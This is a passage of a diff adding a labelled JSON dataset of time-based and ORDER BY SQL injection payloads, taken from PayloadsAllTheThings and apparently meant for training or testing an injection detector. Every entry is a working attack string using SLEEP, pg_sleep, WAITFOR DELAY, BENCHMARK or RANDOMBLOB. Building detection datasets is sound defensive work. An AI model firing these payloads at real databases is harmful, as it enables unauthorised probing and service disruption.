+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "1))||pg_sleep(5)--",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "\"))||pg_sleep(5)--",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "'))||pg_sleep(5)--",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "SLEEP(5)#",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "SLEEP(5)--",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "SLEEP(5)=\"",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "SLEEP(5)='",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "or SLEEP(5)",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "or SLEEP(5)#",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "or SLEEP(5)--",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "or SLEEP(5)=\"",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "or SLEEP(5)='",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "waitfor delay '00:00:05'",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "waitfor delay '00:00:05'--",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "waitfor delay '00:00:05'#",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "benchmark(50000000,MD5(1))",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "benchmark(50000000,MD5(1))--",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "benchmark(50000000,MD5(1))#",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "or benchmark(50000000,MD5(1))",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "or benchmark(50000000,MD5(1))--",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "or benchmark(50000000,MD5(1))#",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "pg_SLEEP(5)",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "pg_SLEEP(5)--",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "pg_SLEEP(5)#",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "or pg_SLEEP(5)",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "or pg_SLEEP(5)--",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "or pg_SLEEP(5)#",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "'\\\"",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "AnD SLEEP(5)",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "AnD SLEEP(5)--",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "AnD SLEEP(5)#",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "&&SLEEP(5)",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "&&SLEEP(5)--",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "&&SLEEP(5)#",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "' AnD SLEEP(5) ANd '1",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "'&&SLEEP(5)&&'1",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY SLEEP(5)",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY SLEEP(5)--",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY SLEEP(5)#",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "(SELECT * FROM (SELECT(SLEEP(5)))ecMj)",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "(SELECT * FROM (SELECT(SLEEP(5)))ecMj)#",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "+benchmark(3200,SHA1(1))+'",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "+ SLEEP(10) + '",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "RANDOMBLOB(500000000/2)",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "RANDOMBLOB(1000000000/2)",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "SLEEP(1)/*' or SLEEP(1) or '\" or SLEEP(1) or \"*/",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 1,SLEEP(5)",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A'))",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 1,SLEEP(5)#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 1,SLEEP(5),3#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 1,SLEEP(5),3,4#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 1,SLEEP(5)--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 1,SLEEP(5),3--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 1,SLEEP(5),3,4--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
